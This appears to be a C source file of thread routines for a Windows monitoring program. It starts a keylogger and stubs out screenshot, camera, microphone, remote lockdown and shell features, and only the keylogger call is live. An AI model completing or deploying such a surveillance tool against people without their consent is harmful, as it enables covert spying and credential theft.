#include "taskRoutines.h"
#include "../Control/keylogger.h"

DWORD WINAPI initFiltering(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
    keylogger();
    while (1) {
        Sleep(1);
    }
    return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
    // TODO: Get screen resolution
    // Capture in requested interval
  //  screenCapture(0, 0, 1920, 1080, "screenshot.bmp");

    return 0;
}
DWORD WINAPI initTimeLockdown(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initCollect(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initShell(LPVOID lpParam)
{
    return 0;
}